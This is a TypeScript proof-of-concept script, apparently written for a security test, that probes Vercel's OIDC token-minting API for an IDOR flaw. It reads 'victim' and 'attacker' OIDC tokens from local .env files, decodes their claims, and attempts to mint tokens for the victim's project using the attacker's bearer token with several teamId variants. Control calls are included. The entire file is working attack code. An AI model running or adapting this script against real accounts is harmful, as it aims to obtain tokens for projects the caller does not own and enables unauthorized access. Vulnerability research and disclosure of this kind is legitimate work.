import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const ATTACKER = loadEnv("/tmp/vercel-sandbox/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
const A = JSON.parse(Buffer.from(ATTACKER.split(".")[1], "base64url").toString());

function claims(t: string) { return JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString()); }

async function mint(label: string, bearer: string, projectId: string, teamId?: string) {
  const url = new URL(`https://api.vercel.com/v1/projects/${projectId}/token`);
  url.searchParams.set("source", "vercel-oidc-refresh");
  if (teamId) url.searchParams.set("teamId", teamId);
  const r = await fetch(url, { method: "POST", headers: { authorization: `Bearer ${bearer}`, "content-type": "application/json" } });
  const text = await r.text();
  console.log(`\n[${r.status}] ${label}`);
  console.log(`  POST ${url.pathname}?${url.searchParams}`);
  let out = text;
  if (r.ok) {
    try {
      const j = JSON.parse(text);
      const c = claims(j.token);
      out = `token minted → owner=${c.owner}, project=${c.project}, project_id=${c.project_id}, owner_id=${c.owner_id}, user_id=${c.user_id}, exp=${new Date(c.exp * 1000).toISOString()}`;
    } catch {}
  }
  console.log("  " + out);
}

async function main() {
  // CONTROLES
  await mint("CTRL: VICTIM mint su propio project", VICTIM, V.project_id, V.owner_id);
  await mint("CTRL: ATTACKER mint su propio project", ATTACKER, A.project_id, A.owner_id);

  // IDOR: atacante intenta mintear token del project de la VÍCTIMA
  await mint("IDOR: ATTACKER mint project VÍCTIMA (teamId=V)", ATTACKER, V.project_id, V.owner_id);
  await mint("IDOR: ATTACKER mint project VÍCTIMA (teamId=A)", ATTACKER, V.project_id, A.owner_id);
  await mint("IDOR: ATTACKER mint project VÍCTIMA (sin teamId)", ATTACKER, V.project_id);

  // IDOR inverso: víctima intenta mintear token del project del atacante
  await mint("IDOR: VICTIM mint project ATTACKER (teamId=A)", VICTIM, A.project_id, A.owner_id);

  console.log("\nDONE");
}
main().catch((e) => console.error("ERR", e.message));